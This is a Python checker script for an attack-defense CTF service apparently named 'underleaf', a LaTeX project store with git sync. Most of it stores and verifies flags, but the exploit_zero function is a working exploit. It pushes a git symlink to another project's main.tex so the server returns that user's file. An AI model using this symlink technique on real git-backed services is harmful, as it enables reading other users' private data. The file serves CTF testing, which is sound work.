import secrets
import json
import os
from typing import Optional, Tuple
from logging import LoggerAdapter

from enochecker3 import Enochecker, PutflagCheckerTaskMessage, GetflagCheckerTaskMessage, HavocCheckerTaskMessage, ExploitCheckerTaskMessage, ChainDB, MumbleException
from enochecker3.utils import assert_equals, assert_in
from httpx import AsyncClient, Response, RequestError

service_port = 4242

checker = Enochecker("underleaf", service_port)
app = lambda: checker.app

def response_ok(response: Response, message:str, logger: LoggerAdapter) -> dict:
    assert_equals(response.status_code, 200, message)

    try:
        json = response.json()
    except json.JSONDecodeError:
        raise MumbleException(message)

    assert_in("status", json, "test")
    if json["status"] != "ok" and logger is not None:
        logger.debug(json["message"])
        
    assert_equals(json["status"], "ok", "message")

    return json


async def register_user(client: AsyncClient, logger: LoggerAdapter) -> Tuple[str, str, str]:
    username = secrets.token_hex(8)
    password = secrets.token_hex(8)
    try:
        response = await client.post("/api/auth/register", data={"username": username, "password": password}, follow_redirects=True)
    except RequestError:
        raise MumbleException("request error while registering in")

    assert_equals(response.status_code, 200, "registration failed")
    
    json = response_ok(response, "registration failed", logger)

    assert_in("token", json, "registration failed")
    assert_equals(True, len(json["token"]) > 0, "registration failed")

    client.headers["Authorization"] = f"Bearer {json['token']}"

    return username, password, json["token"]

async def login_user(client: AsyncClient, username: str, password: str, logger: LoggerAdapter) -> None:
    try:
        response = await client.post("/api/auth/login", data={"username": username, "password": password}, follow_redirects=True)
    except RequestError:
        raise MumbleException("request error while logging in")

    json = response_ok(response, "logging in failed", logger)

    assert_in("token", json, "registration failed")
    assert_equals(True, len(json["token"]) > 0, "registration failed")

    client.headers["Authorization"] = f"Bearer {json['token']}"

async def create_project(client: AsyncClient, logger: LoggerAdapter) -> Tuple[str, str]:
    project_name = secrets.token_hex(8)
    try:
        response = await client.post("/api/project/create", data={"name": project_name}, follow_redirects=True)
    except RequestError:
        raise MumbleException("request error while creating project")

    json = response_ok(response, "creating project failed", logger)
    assert_in("id", json, "creating project failed")

    assert_equals(True, json["id"].isalnum(), "creating project failed")

    return project_name, json["id"]

async def upload_file(client: AsyncClient, project_id: str, filename: str, data: str, logger: LoggerAdapter) -> None:
    if not filename.startswith("/"):
        filename = f"/{filename}"

    try:
        response = await client.post(f"/api/files/upload/{project_id}{filename}", files={'file': data.encode('utf-8')}, follow_redirects=True)
    except RequestError:
        raise MumbleException("request error while uploading file")

    response_ok(response, "uploading file failed", logger)

async def download_file(client: AsyncClient, project_id: str, filename: str, logger: LoggerAdapter) -> str:
    if not filename.startswith("/"):
        filename = f"/{filename}"

    try:
        response = await client.get(f"/api/files/download/{project_id}{filename}", follow_redirects=True)
    except RequestError:
        raise MumbleException("request error while downloading file")

    assert_equals(response.status_code, 200, "downloading file failed")

    return response.content.decode('utf-8')

async def commit(client: AsyncClient, project_id: str, message: str, logger: LoggerAdapter) -> None:
    try:
        response = await client.post(f"/api/git/commit/{project_id}", data={"message": message}, follow_redirects=True)
    except RequestError:
        raise MumbleException("request error while committing")

    response_ok(response, "committing failed", logger)

async def push(client: AsyncClient, project_id: str, logger: LoggerAdapter) -> None:
    try:
        response = await client.get(f"/api/git/push/{project_id}", follow_redirects=True)
    except RequestError:
        raise MumbleException("request error while pushing")

    response_ok(response, "pushing failed", logger)

async def pull(client: AsyncClient, project_id: str, logger: LoggerAdapter) -> None:
    try:
        response = await client.get(f"/api/git/pull/{project_id}", follow_redirects=True)
    except RequestError:
        raise MumbleException("request error while pulling")

    response_ok(response, "pulling failed", logger)

@checker.putflag(0)
async def putflag_zero(task: PutflagCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> str:
    (username, password, _) = await register_user(client, logger)
    await db.set("credentials", (username, password))
    
    (name, id) = await create_project(client, logger)
    await db.set("project", (name, id))

    await upload_file(client, id, "main.tex", task.flag, logger)

    return id

@checker.getflag(0)
async def getflag_zero(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> str:    
    try:
        (username, password) = await db.get("credentials")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    await login_user(client, username, password, logger)

    try:
        (_, id) = await db.get("project")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")


    assert_equals(await download_file(client, id, 'main.tex', logger), task.flag, "flag dose not match")

def os_succ(code):
    if code != 0:
        raise Exception("Internal error os command failed")

@checker.havoc(0)
async def havoc_test_git(task: HavocCheckerTaskMessage, client: AsyncClient, logger: LoggerAdapter) -> None:
    (username, password, _) = await register_user(client, logger)
    (_, id) = await create_project(client, logger)

    # upload a file to the project
    file_content = secrets.token_hex(32)
    await upload_file(client, id, "main.tex", file_content, logger)
    # commit the file
    await commit(client, id, "Added main.tex", logger)
    # push the change
    await push(client, id, logger)

    dev_null = "  > /dev/null 2>&1"

    # clone the repo onto the checker
    git_url = f"http://{username}:{password}@{task.address}:{service_port}/git/{id}"
    
    if os.system(f"git -C /tmp/ clone {git_url} {dev_null}") != 0:
        raise MumbleException("git clone failed")

    # check, that the file is present
    assert_equals(os.path.exists(f"/tmp/{id}/"), True, "git clone failed")
    assert_equals(os.path.exists(f"/tmp/{id}/main.tex"), True, "file not created")
    assert_equals(open("/tmp/{id}/main.tex".format(id=id)).read(), file_content, "file content does not match")

    # add a file locally
    new_file_content = secrets.token_hex(32)
    open(f"/tmp/{id}/newFile.tex", "w").write(new_file_content)

    # commit it
    os_succ(os.system(f"git -C /tmp/{id} config user.email \"{username}@example.com\" {dev_null}"))
    os_succ(os.system(f"git -C /tmp/{id} config user.name \"{username}\" {dev_null}"))
    
    os_succ(os.system(f"git -C /tmp/{id} add . {dev_null}"))
    os_succ(os.system(f"git -C /tmp/{id} commit -m 'Added newFile.tex' {dev_null}"))

    # push it onto the server
    if os.system(f"git -C /tmp/{id} push {dev_null}") != 0:
        raise MumbleException("git push failed")

    # cleanup
    os_succ(os.system(f"rm -rf /tmp/{id}/ {dev_null}"))

    # let the server pull the changes
    await pull(client, id, logger)

    # download the file
    new_file_content_dl = await download_file(client, id, "newFile.tex", logger)
    assert_equals(new_file_content_dl, new_file_content, "file content does not match")

@checker.exploit(0)
async def exploit_zero(task: ExploitCheckerTaskMessage, client: AsyncClient, logger: LoggerAdapter) -> str:
    (username, password, _) = await register_user(client, logger)
    (_, id) = await create_project(client, logger)

    dev_null = "  > /dev/null 2>&1"

    # clone the repo onto the checker
    git_url = f"http://{username}:{password}@{task.address}:{service_port}/git/{id}"
    
    if os.system(f"git -C /tmp/ clone {git_url} {dev_null}") != 0:
        raise MumbleException("git clone failed")

    # check, that the file is present
    assert_equals(os.path.exists(f"/tmp/{id}/"), True, "git clone failed")
    assert_equals(os.path.exists(f"/tmp/{id}/main.tex"), True, "file not created")

    # add a symlink
    f_id = task.attack_info

    target = f"/app/data/projects/{f_id[0:2]}/{f_id}/main.tex"
    os_succ(os.system(f"mkdir -p {target}/.. {dev_null}"))
    os_succ(os.system(f"touch {target} {dev_null}"))
    os_succ(os.system(f"ln -s {target} /tmp/{id}/link"))
    os_succ(os.system(f"rm -rf {target} {dev_null}"))

    # commit it
    os_succ(os.system(f"git -C /tmp/{id} config user.email \"{username}@example.com\" {dev_null}"))
    os_succ(os.system(f"git -C /tmp/{id} config user.name \"{username}\" {dev_null}"))
    
    os_succ(os.system(f"git -C /tmp/{id} add . {dev_null}"))
    os_succ(os.system(f"git -C /tmp/{id} commit -m 'Exploit!' {dev_null}"))

    # push it onto the server
    if os.system(f"git -C /tmp/{id} push {dev_null}") != 0:
        raise MumbleException("git push failed")

    # cleanup
    os_succ(os.system(f"rm -rf /tmp/{id}/ {dev_null}"))

    # let the server pull the changes
    await pull(client, id, logger)

    # get flag
    return await download_file(client, id, "link", logger)    


if __name__ == "__main__":
    checker.run()
